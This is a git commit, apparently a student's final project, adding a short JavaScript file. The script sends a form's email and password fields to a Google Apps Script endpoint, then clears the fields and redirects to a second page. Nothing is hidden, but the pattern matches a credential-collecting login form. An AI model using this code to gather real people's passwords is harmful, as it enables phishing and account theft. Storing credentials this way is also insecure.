8070ce2ff8bce4ac6874b9506ff09632d434a35d
Npins4 <npinson@movingeverest.org>
2021-10-07 18:35:42 -0500

    Final Project

---
+++ Forms/LIapp.js
@@ -0,0 +1,18 @@
+const scriptURL = 'https://script.google.com/macros/s/AKfycbwx01oUcTFdn7nPW1mH-Svgu7Bmfl4HmNz7tY3ccch_aEzQOtorgyAZWDEv7AtcQ6RzXw/exec'
+const form = document.querySelector('form')
+
+form.addEventListener('submit', (e) => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response => console.log('Success!', response))
+        .then(() => {
+            //This is where I write my code
+document.querySelector('#email').value = ""
+document.querySelector('#password').value = ""
+window.location.href = '../Page 2/page2_index.html' 
+
+
+            //Do not alter below this line
+        })
+        .catch(error => console.error('Error!', error.message))
+})
